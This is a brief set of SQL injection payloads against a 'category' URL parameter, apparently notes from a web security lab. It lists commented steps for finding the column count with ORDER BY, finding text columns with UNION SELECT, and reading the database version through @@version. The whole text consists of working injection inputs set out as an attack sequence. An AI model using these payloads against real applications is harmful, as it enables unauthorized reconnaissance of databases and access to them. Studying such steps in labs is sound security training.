#Determine number of col
category=Pets' ORDER BY 3--

#Determine which col contain text data
category=Pets' UNION SELECT 'A','B' FROM DUAL--

#Determine its type and version
category=Pets' union select @@version,null -- fd
